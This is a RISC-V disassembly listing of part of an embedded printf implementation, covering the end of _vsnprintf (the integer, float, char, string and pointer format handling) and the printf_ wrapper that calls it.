    100047fa:	f9043583          	ld	a1,-112(s0)
    100047fe:	f9843503          	ld	a0,-104(s0)
    10004802:	dddfe0ef          	jal	100035de <_ntoa_long_long>
    10004806:	fca43c23          	sd	a0,-40(s0)
    1000480a:	a8f9                	j	100048e8 <_vsnprintf+0x7ea>
    1000480c:	fec42783          	lw	a5,-20(s0)
    10004810:	1007f793          	andi	a5,a5,256
    10004814:	2781                	sext.w	a5,a5
    10004816:	c3b1                	beqz	a5,1000485a <_vsnprintf+0x75c>
    10004818:	f7843783          	ld	a5,-136(s0)
    1000481c:	00878713          	addi	a4,a5,8
    10004820:	f6e43c23          	sd	a4,-136(s0)
    10004824:	6398                	ld	a4,0(a5)
    10004826:	fd446683          	lwu	a3,-44(s0)
    1000482a:	fe442603          	lw	a2,-28(s0)
    1000482e:	fec42783          	lw	a5,-20(s0)
    10004832:	e43e                	sd	a5,8(sp)
    10004834:	fe842783          	lw	a5,-24(s0)
    10004838:	e03e                	sd	a5,0(sp)
    1000483a:	88b2                	mv	a7,a2
    1000483c:	8836                	mv	a6,a3
    1000483e:	4781                	li	a5,0
    10004840:	f8843683          	ld	a3,-120(s0)
    10004844:	fd843603          	ld	a2,-40(s0)
    10004848:	f9043583          	ld	a1,-112(s0)
    1000484c:	f9843503          	ld	a0,-104(s0)
    10004850:	c79fe0ef          	jal	100034c8 <_ntoa_long>
    10004854:	fca43c23          	sd	a0,-40(s0)
    10004858:	a841                	j	100048e8 <_vsnprintf+0x7ea>
    1000485a:	fec42783          	lw	a5,-20(s0)
    1000485e:	0407f793          	andi	a5,a5,64
    10004862:	2781                	sext.w	a5,a5
    10004864:	cf81                	beqz	a5,1000487c <_vsnprintf+0x77e>
    10004866:	f7843783          	ld	a5,-136(s0)
    1000486a:	00878713          	addi	a4,a5,8
    1000486e:	f6e43c23          	sd	a4,-136(s0)
    10004872:	439c                	lw	a5,0(a5)
    10004874:	0ff7f793          	zext.b	a5,a5
    10004878:	2781                	sext.w	a5,a5
    1000487a:	a815                	j	100048ae <_vsnprintf+0x7b0>
    1000487c:	fec42783          	lw	a5,-20(s0)
    10004880:	0807f793          	andi	a5,a5,128
    10004884:	2781                	sext.w	a5,a5
    10004886:	cf81                	beqz	a5,1000489e <_vsnprintf+0x7a0>
    10004888:	f7843783          	ld	a5,-136(s0)
    1000488c:	00878713          	addi	a4,a5,8
    10004890:	f6e43c23          	sd	a4,-136(s0)
    10004894:	439c                	lw	a5,0(a5)
    10004896:	0807c7bb          	zext.h	a5,a5
    1000489a:	2781                	sext.w	a5,a5
    1000489c:	a801                	j	100048ac <_vsnprintf+0x7ae>
    1000489e:	f7843783          	ld	a5,-136(s0)
    100048a2:	00878713          	addi	a4,a5,8
    100048a6:	f6e43c23          	sd	a4,-136(s0)
    100048aa:	439c                	lw	a5,0(a5)
    100048ac:	2781                	sext.w	a5,a5
    100048ae:	faf42a23          	sw	a5,-76(s0)
    100048b2:	fb446703          	lwu	a4,-76(s0)
    100048b6:	fd446683          	lwu	a3,-44(s0)
    100048ba:	fe442603          	lw	a2,-28(s0)
    100048be:	fec42783          	lw	a5,-20(s0)
    100048c2:	e43e                	sd	a5,8(sp)
    100048c4:	fe842783          	lw	a5,-24(s0)
    100048c8:	e03e                	sd	a5,0(sp)
    100048ca:	88b2                	mv	a7,a2
    100048cc:	8836                	mv	a6,a3
    100048ce:	4781                	li	a5,0
    100048d0:	f8843683          	ld	a3,-120(s0)
    100048d4:	fd843603          	ld	a2,-40(s0)
    100048d8:	f9043583          	ld	a1,-112(s0)
    100048dc:	f9843503          	ld	a0,-104(s0)
    100048e0:	be9fe0ef          	jal	100034c8 <_ntoa_long>
    100048e4:	fca43c23          	sd	a0,-40(s0)
    100048e8:	f8043783          	ld	a5,-128(s0)
    100048ec:	0785                	addi	a5,a5,1
    100048ee:	f8f43023          	sd	a5,-128(s0)
    100048f2:	a131                	j	10004cfe <_vsnprintf+0xc00>
    100048f4:	f8043783          	ld	a5,-128(s0)
    100048f8:	0007c783          	lbu	a5,0(a5)
    100048fc:	873e                	mv	a4,a5
    100048fe:	04600793          	li	a5,70
    10004902:	00f71863          	bne	a4,a5,10004912 <_vsnprintf+0x814>
    10004906:	fec42783          	lw	a5,-20(s0)
    1000490a:	0207e793          	ori	a5,a5,32
    1000490e:	fef42623          	sw	a5,-20(s0)
    10004912:	f7843783          	ld	a5,-136(s0)
    10004916:	00878713          	addi	a4,a5,8
    1000491a:	f6e43c23          	sd	a4,-136(s0)
    1000491e:	239c                	fld	fa5,0(a5)
    10004920:	fec42683          	lw	a3,-20(s0)
    10004924:	fe842783          	lw	a5,-24(s0)
    10004928:	fe442703          	lw	a4,-28(s0)
    1000492c:	8836                	mv	a6,a3
    1000492e:	22f78553          	fmv.d	fa0,fa5
    10004932:	f8843683          	ld	a3,-120(s0)
    10004936:	fd843603          	ld	a2,-40(s0)
    1000493a:	f9043583          	ld	a1,-112(s0)
    1000493e:	f9843503          	ld	a0,-104(s0)
    10004942:	db3fe0ef          	jal	100036f4 <_ftoa>
    10004946:	fca43c23          	sd	a0,-40(s0)
    1000494a:	f8043783          	ld	a5,-128(s0)
    1000494e:	0785                	addi	a5,a5,1
    10004950:	f8f43023          	sd	a5,-128(s0)
    10004954:	a66d                	j	10004cfe <_vsnprintf+0xc00>
    10004956:	f8043783          	ld	a5,-128(s0)
    1000495a:	0007c783          	lbu	a5,0(a5)
    1000495e:	873e                	mv	a4,a5
    10004960:	06700793          	li	a5,103
    10004964:	00f70b63          	beq	a4,a5,1000497a <_vsnprintf+0x87c>
    10004968:	f8043783          	ld	a5,-128(s0)
    1000496c:	0007c783          	lbu	a5,0(a5)
    10004970:	873e                	mv	a4,a5
    10004972:	04700793          	li	a5,71
    10004976:	00f71a63          	bne	a4,a5,1000498a <_vsnprintf+0x88c>
    1000497a:	fec42783          	lw	a5,-20(s0)
    1000497e:	873e                	mv	a4,a5
    10004980:	28b01793          	bseti	a5,zero,0xb
    10004984:	8fd9                	or	a5,a5,a4
    10004986:	fef42623          	sw	a5,-20(s0)
    1000498a:	f8043783          	ld	a5,-128(s0)
    1000498e:	0007c783          	lbu	a5,0(a5)
    10004992:	873e                	mv	a4,a5
    10004994:	04500793          	li	a5,69
    10004998:	00f70b63          	beq	a4,a5,100049ae <_vsnprintf+0x8b0>
    1000499c:	f8043783          	ld	a5,-128(s0)
    100049a0:	0007c783          	lbu	a5,0(a5)
    100049a4:	873e                	mv	a4,a5
    100049a6:	04700793          	li	a5,71
    100049aa:	00f71863          	bne	a4,a5,100049ba <_vsnprintf+0x8bc>
    100049ae:	fec42783          	lw	a5,-20(s0)
    100049b2:	0207e793          	ori	a5,a5,32
    100049b6:	fef42623          	sw	a5,-20(s0)
    100049ba:	f7843783          	ld	a5,-136(s0)
    100049be:	00878713          	addi	a4,a5,8
    100049c2:	f6e43c23          	sd	a4,-136(s0)
    100049c6:	239c                	fld	fa5,0(a5)
    100049c8:	fec42683          	lw	a3,-20(s0)
    100049cc:	fe842783          	lw	a5,-24(s0)
    100049d0:	fe442703          	lw	a4,-28(s0)
    100049d4:	8836                	mv	a6,a3
    100049d6:	22f78553          	fmv.d	fa0,fa5
    100049da:	f8843683          	ld	a3,-120(s0)
    100049de:	fd843603          	ld	a2,-40(s0)
    100049e2:	f9043583          	ld	a1,-112(s0)
    100049e6:	f9843503          	ld	a0,-104(s0)
    100049ea:	a4cff0ef          	jal	10003c36 <_etoa>
    100049ee:	fca43c23          	sd	a0,-40(s0)
    100049f2:	f8043783          	ld	a5,-128(s0)
    100049f6:	0785                	addi	a5,a5,1
    100049f8:	f8f43023          	sd	a5,-128(s0)
    100049fc:	a609                	j	10004cfe <_vsnprintf+0xc00>
    100049fe:	4785                	li	a5,1
    10004a00:	fcf42823          	sw	a5,-48(s0)
    10004a04:	fec42783          	lw	a5,-20(s0)
    10004a08:	8b89                	andi	a5,a5,2
    10004a0a:	2781                	sext.w	a5,a5
    10004a0c:	ef8d                	bnez	a5,10004a46 <_vsnprintf+0x948>
    10004a0e:	a00d                	j	10004a30 <_vsnprintf+0x932>
    10004a10:	fd843783          	ld	a5,-40(s0)
    10004a14:	00178713          	addi	a4,a5,1
    10004a18:	fce43c23          	sd	a4,-40(s0)
    10004a1c:	f9843703          	ld	a4,-104(s0)
    10004a20:	f8843683          	ld	a3,-120(s0)
    10004a24:	863e                	mv	a2,a5
    10004a26:	f9043583          	ld	a1,-112(s0)
    10004a2a:	02000513          	li	a0,32
    10004a2e:	9702                	jalr	a4
    10004a30:	fd042783          	lw	a5,-48(s0)
    10004a34:	0017871b          	addiw	a4,a5,1
    10004a38:	fce42823          	sw	a4,-48(s0)
    10004a3c:	fe842703          	lw	a4,-24(s0)
    10004a40:	2701                	sext.w	a4,a4
    10004a42:	fce7e7e3          	bltu	a5,a4,10004a10 <_vsnprintf+0x912>
    10004a46:	f7843783          	ld	a5,-136(s0)
    10004a4a:	00878713          	addi	a4,a5,8
    10004a4e:	f6e43c23          	sd	a4,-136(s0)
    10004a52:	439c                	lw	a5,0(a5)
    10004a54:	0ff7f513          	zext.b	a0,a5
    10004a58:	fd843783          	ld	a5,-40(s0)
    10004a5c:	00178713          	addi	a4,a5,1
    10004a60:	fce43c23          	sd	a4,-40(s0)
    10004a64:	f9843703          	ld	a4,-104(s0)
    10004a68:	f8843683          	ld	a3,-120(s0)
    10004a6c:	863e                	mv	a2,a5
    10004a6e:	f9043583          	ld	a1,-112(s0)
    10004a72:	9702                	jalr	a4
    10004a74:	fec42783          	lw	a5,-20(s0)
    10004a78:	8b89                	andi	a5,a5,2
    10004a7a:	2781                	sext.w	a5,a5
    10004a7c:	cf8d                	beqz	a5,10004ab6 <_vsnprintf+0x9b8>
    10004a7e:	a00d                	j	10004aa0 <_vsnprintf+0x9a2>
    10004a80:	fd843783          	ld	a5,-40(s0)
    10004a84:	00178713          	addi	a4,a5,1
    10004a88:	fce43c23          	sd	a4,-40(s0)
    10004a8c:	f9843703          	ld	a4,-104(s0)
    10004a90:	f8843683          	ld	a3,-120(s0)
    10004a94:	863e                	mv	a2,a5
    10004a96:	f9043583          	ld	a1,-112(s0)
    10004a9a:	02000513          	li	a0,32
    10004a9e:	9702                	jalr	a4
    10004aa0:	fd042783          	lw	a5,-48(s0)
    10004aa4:	0017871b          	addiw	a4,a5,1
    10004aa8:	fce42823          	sw	a4,-48(s0)
    10004aac:	fe842703          	lw	a4,-24(s0)
    10004ab0:	2701                	sext.w	a4,a4
    10004ab2:	fce7e7e3          	bltu	a5,a4,10004a80 <_vsnprintf+0x982>
    10004ab6:	f8043783          	ld	a5,-128(s0)
    10004aba:	0785                	addi	a5,a5,1
    10004abc:	f8f43023          	sd	a5,-128(s0)
    10004ac0:	ac3d                	j	10004cfe <_vsnprintf+0xc00>
    10004ac2:	f7843783          	ld	a5,-136(s0)
    10004ac6:	00878713          	addi	a4,a5,8
    10004aca:	f6e43c23          	sd	a4,-136(s0)
    10004ace:	639c                	ld	a5,0(a5)
    10004ad0:	fcf43423          	sd	a5,-56(s0)
    10004ad4:	fe442783          	lw	a5,-28(s0)
    10004ad8:	2781                	sext.w	a5,a5
    10004ada:	c781                	beqz	a5,10004ae2 <_vsnprintf+0x9e4>
    10004adc:	fe446783          	lwu	a5,-28(s0)
    10004ae0:	a011                	j	10004ae4 <_vsnprintf+0x9e6>
    10004ae2:	57fd                	li	a5,-1
    10004ae4:	85be                	mv	a1,a5
    10004ae6:	fc843503          	ld	a0,-56(s0)
    10004aea:	d36fe0ef          	jal	10003020 <_strnlen_s>
    10004aee:	87aa                	mv	a5,a0
    10004af0:	fcf42223          	sw	a5,-60(s0)
    10004af4:	fec42783          	lw	a5,-20(s0)
    10004af8:	4007f793          	andi	a5,a5,1024
    10004afc:	2781                	sext.w	a5,a5
    10004afe:	cb89                	beqz	a5,10004b10 <_vsnprintf+0xa12>
    10004b00:	fe446703          	lwu	a4,-28(s0)
    10004b04:	fc446783          	lwu	a5,-60(s0)
    10004b08:	0af757b3          	minu	a5,a4,a5
    10004b0c:	fcf42223          	sw	a5,-60(s0)
    10004b10:	fec42783          	lw	a5,-20(s0)
    10004b14:	8b89                	andi	a5,a5,2
    10004b16:	2781                	sext.w	a5,a5
    10004b18:	e7a5                	bnez	a5,10004b80 <_vsnprintf+0xa82>
    10004b1a:	a00d                	j	10004b3c <_vsnprintf+0xa3e>
    10004b1c:	fd843783          	ld	a5,-40(s0)
    10004b20:	00178713          	addi	a4,a5,1
    10004b24:	fce43c23          	sd	a4,-40(s0)
    10004b28:	f9843703          	ld	a4,-104(s0)
    10004b2c:	f8843683          	ld	a3,-120(s0)
    10004b30:	863e                	mv	a2,a5
    10004b32:	f9043583          	ld	a1,-112(s0)
    10004b36:	02000513          	li	a0,32
    10004b3a:	9702                	jalr	a4
    10004b3c:	fc442783          	lw	a5,-60(s0)
    10004b40:	0017871b          	addiw	a4,a5,1
    10004b44:	fce42223          	sw	a4,-60(s0)
    10004b48:	fe842703          	lw	a4,-24(s0)
    10004b4c:	2701                	sext.w	a4,a4
    10004b4e:	fce7e7e3          	bltu	a5,a4,10004b1c <_vsnprintf+0xa1e>
    10004b52:	a03d                	j	10004b80 <_vsnprintf+0xa82>
    10004b54:	fc843783          	ld	a5,-56(s0)
    10004b58:	00178713          	addi	a4,a5,1
    10004b5c:	fce43423          	sd	a4,-56(s0)
    10004b60:	0007c503          	lbu	a0,0(a5)
    10004b64:	fd843783          	ld	a5,-40(s0)
    10004b68:	00178713          	addi	a4,a5,1
    10004b6c:	fce43c23          	sd	a4,-40(s0)
    10004b70:	f9843703          	ld	a4,-104(s0)
    10004b74:	f8843683          	ld	a3,-120(s0)
    10004b78:	863e                	mv	a2,a5
    10004b7a:	f9043583          	ld	a1,-112(s0)
    10004b7e:	9702                	jalr	a4
    10004b80:	fc843783          	ld	a5,-56(s0)
    10004b84:	0007c783          	lbu	a5,0(a5)
    10004b88:	cf91                	beqz	a5,10004ba4 <_vsnprintf+0xaa6>
    10004b8a:	fec42783          	lw	a5,-20(s0)
    10004b8e:	4007f793          	andi	a5,a5,1024
    10004b92:	2781                	sext.w	a5,a5
    10004b94:	d3e1                	beqz	a5,10004b54 <_vsnprintf+0xa56>
    10004b96:	fe442783          	lw	a5,-28(s0)
    10004b9a:	fff7871b          	addiw	a4,a5,-1
    10004b9e:	fee42223          	sw	a4,-28(s0)
    10004ba2:	fbcd                	bnez	a5,10004b54 <_vsnprintf+0xa56>
    10004ba4:	fec42783          	lw	a5,-20(s0)
    10004ba8:	8b89                	andi	a5,a5,2
    10004baa:	2781                	sext.w	a5,a5
    10004bac:	cf8d                	beqz	a5,10004be6 <_vsnprintf+0xae8>
    10004bae:	a00d                	j	10004bd0 <_vsnprintf+0xad2>
    10004bb0:	fd843783          	ld	a5,-40(s0)
    10004bb4:	00178713          	addi	a4,a5,1
    10004bb8:	fce43c23          	sd	a4,-40(s0)
    10004bbc:	f9843703          	ld	a4,-104(s0)
    10004bc0:	f8843683          	ld	a3,-120(s0)
    10004bc4:	863e                	mv	a2,a5
    10004bc6:	f9043583          	ld	a1,-112(s0)
    10004bca:	02000513          	li	a0,32
    10004bce:	9702                	jalr	a4
    10004bd0:	fc442783          	lw	a5,-60(s0)
    10004bd4:	0017871b          	addiw	a4,a5,1
    10004bd8:	fce42223          	sw	a4,-60(s0)
    10004bdc:	fe842703          	lw	a4,-24(s0)
    10004be0:	2701                	sext.w	a4,a4
    10004be2:	fce7e7e3          	bltu	a5,a4,10004bb0 <_vsnprintf+0xab2>
    10004be6:	f8043783          	ld	a5,-128(s0)
    10004bea:	0785                	addi	a5,a5,1
    10004bec:	f8f43023          	sd	a5,-128(s0)
    10004bf0:	a239                	j	10004cfe <_vsnprintf+0xc00>
    10004bf2:	47c1                	li	a5,16
    10004bf4:	fef42423          	sw	a5,-24(s0)
    10004bf8:	fec42783          	lw	a5,-20(s0)
    10004bfc:	0217e793          	ori	a5,a5,33
    10004c00:	fef42623          	sw	a5,-20(s0)
    10004c04:	4785                	li	a5,1
    10004c06:	faf40da3          	sb	a5,-69(s0)
    10004c0a:	fbb44783          	lbu	a5,-69(s0)
    10004c0e:	0ff7f793          	zext.b	a5,a5
    10004c12:	c3b1                	beqz	a5,10004c56 <_vsnprintf+0xb58>
    10004c14:	f7843783          	ld	a5,-136(s0)
    10004c18:	00878713          	addi	a4,a5,8
    10004c1c:	f6e43c23          	sd	a4,-136(s0)
    10004c20:	639c                	ld	a5,0(a5)
    10004c22:	86be                	mv	a3,a5
    10004c24:	fe442703          	lw	a4,-28(s0)
    10004c28:	fec42783          	lw	a5,-20(s0)
    10004c2c:	e43e                	sd	a5,8(sp)
    10004c2e:	fe842783          	lw	a5,-24(s0)
    10004c32:	e03e                	sd	a5,0(sp)
    10004c34:	88ba                	mv	a7,a4
    10004c36:	4841                	li	a6,16
    10004c38:	4781                	li	a5,0
    10004c3a:	8736                	mv	a4,a3
    10004c3c:	f8843683          	ld	a3,-120(s0)
    10004c40:	fd843603          	ld	a2,-40(s0)
    10004c44:	f9043583          	ld	a1,-112(s0)
    10004c48:	f9843503          	ld	a0,-104(s0)
    10004c4c:	993fe0ef          	jal	100035de <_ntoa_long_long>
    10004c50:	fca43c23          	sd	a0,-40(s0)
    10004c54:	a089                	j	10004c96 <_vsnprintf+0xb98>
    10004c56:	f7843783          	ld	a5,-136(s0)
    10004c5a:	00878713          	addi	a4,a5,8
    10004c5e:	f6e43c23          	sd	a4,-136(s0)
    10004c62:	639c                	ld	a5,0(a5)
    10004c64:	86be                	mv	a3,a5
    10004c66:	fe442703          	lw	a4,-28(s0)
    10004c6a:	fec42783          	lw	a5,-20(s0)
    10004c6e:	e43e                	sd	a5,8(sp)
    10004c70:	fe842783          	lw	a5,-24(s0)
    10004c74:	e03e                	sd	a5,0(sp)
    10004c76:	88ba                	mv	a7,a4
    10004c78:	4841                	li	a6,16
    10004c7a:	4781                	li	a5,0
    10004c7c:	8736                	mv	a4,a3
    10004c7e:	f8843683          	ld	a3,-120(s0)
    10004c82:	fd843603          	ld	a2,-40(s0)
    10004c86:	f9043583          	ld	a1,-112(s0)
    10004c8a:	f9843503          	ld	a0,-104(s0)
    10004c8e:	83bfe0ef          	jal	100034c8 <_ntoa_long>
    10004c92:	fca43c23          	sd	a0,-40(s0)
    10004c96:	f8043783          	ld	a5,-128(s0)
    10004c9a:	0785                	addi	a5,a5,1
    10004c9c:	f8f43023          	sd	a5,-128(s0)
    10004ca0:	a8b9                	j	10004cfe <_vsnprintf+0xc00>
    10004ca2:	fd843783          	ld	a5,-40(s0)
    10004ca6:	00178713          	addi	a4,a5,1
    10004caa:	fce43c23          	sd	a4,-40(s0)
    10004cae:	f9843703          	ld	a4,-104(s0)
    10004cb2:	f8843683          	ld	a3,-120(s0)
    10004cb6:	863e                	mv	a2,a5
    10004cb8:	f9043583          	ld	a1,-112(s0)
    10004cbc:	02500513          	li	a0,37
    10004cc0:	9702                	jalr	a4
    10004cc2:	f8043783          	ld	a5,-128(s0)
    10004cc6:	0785                	addi	a5,a5,1
    10004cc8:	f8f43023          	sd	a5,-128(s0)
    10004ccc:	a80d                	j	10004cfe <_vsnprintf+0xc00>
    10004cce:	f8043783          	ld	a5,-128(s0)
    10004cd2:	0007c503          	lbu	a0,0(a5)
    10004cd6:	fd843783          	ld	a5,-40(s0)
    10004cda:	00178713          	addi	a4,a5,1
    10004cde:	fce43c23          	sd	a4,-40(s0)
    10004ce2:	f9843703          	ld	a4,-104(s0)
    10004ce6:	f8843683          	ld	a3,-120(s0)
    10004cea:	863e                	mv	a2,a5
    10004cec:	f9043583          	ld	a1,-112(s0)
    10004cf0:	9702                	jalr	a4
    10004cf2:	f8043783          	ld	a5,-128(s0)
    10004cf6:	0785                	addi	a5,a5,1
    10004cf8:	f8f43023          	sd	a5,-128(s0)
    10004cfc:	0001                	nop
    10004cfe:	f8043783          	ld	a5,-128(s0)
    10004d02:	0007c783          	lbu	a5,0(a5)
    10004d06:	c2079863          	bnez	a5,10004136 <_vsnprintf+0x38>
    10004d0a:	fd843703          	ld	a4,-40(s0)
    10004d0e:	f8843783          	ld	a5,-120(s0)
    10004d12:	00f76663          	bltu	a4,a5,10004d1e <_vsnprintf+0xc20>
    10004d16:	f8843783          	ld	a5,-120(s0)
    10004d1a:	17fd                	addi	a5,a5,-1
    10004d1c:	a019                	j	10004d22 <_vsnprintf+0xc24>
    10004d1e:	fd843783          	ld	a5,-40(s0)
    10004d22:	f9843703          	ld	a4,-104(s0)
    10004d26:	f8843683          	ld	a3,-120(s0)
    10004d2a:	863e                	mv	a2,a5
    10004d2c:	f9043583          	ld	a1,-112(s0)
    10004d30:	4501                	li	a0,0
    10004d32:	9702                	jalr	a4
    10004d34:	fd843783          	ld	a5,-40(s0)
    10004d38:	2781                	sext.w	a5,a5
    10004d3a:	853e                	mv	a0,a5
    10004d3c:	60ea                	ld	ra,152(sp)
    10004d3e:	644a                	ld	s0,144(sp)
    10004d40:	610d                	addi	sp,sp,160
    10004d42:	8082                	ret

Disassembly of section .text.printf_:

0000000010004d44 <printf_>:
    10004d44:	7119                	addi	sp,sp,-128
    10004d46:	fc06                	sd	ra,56(sp)
    10004d48:	f822                	sd	s0,48(sp)
    10004d4a:	0080                	addi	s0,sp,64
    10004d4c:	fca43423          	sd	a0,-56(s0)
    10004d50:	e40c                	sd	a1,8(s0)
    10004d52:	e810                	sd	a2,16(s0)
    10004d54:	ec14                	sd	a3,24(s0)
    10004d56:	f018                	sd	a4,32(s0)
    10004d58:	f41c                	sd	a5,40(s0)
    10004d5a:	03043823          	sd	a6,48(s0)
    10004d5e:	03143c23          	sd	a7,56(s0)
    10004d62:	04040793          	addi	a5,s0,64
    10004d66:	fcf43023          	sd	a5,-64(s0)
    10004d6a:	fc043783          	ld	a5,-64(s0)
    10004d6e:	fc878793          	addi	a5,a5,-56
    10004d72:	fef43023          	sd	a5,-32(s0)
    10004d76:	fe043703          	ld	a4,-32(s0)
    10004d7a:	fd840793          	addi	a5,s0,-40
    10004d7e:	fc843683          	ld	a3,-56(s0)
    10004d82:	567d                	li	a2,-1
    10004d84:	85be                	mv	a1,a5
    10004d86:	ffffe517          	auipc	a0,0xffffe
    10004d8a:	26250513          	addi	a0,a0,610 # 10002fe8 <_out_char>
    10004d8e:	b70ff0ef          	jal	100040fe <_vsnprintf>
    10004d92:	87aa                	mv	a5,a0
    10004d94:	fef42623          	sw	a5,-20(s0)
    10004d98:	fec42783          	lw	a5,-20(s0)
    10004d9c:	853e                	mv	a0,a5
    10004d9e:	70e2                	ld	ra,56(sp)
    10004da0:	7442                	ld	s0,48(sp)
    10004da2:	6109                	addi	sp,sp,128
    10004da4:	8082                	ret
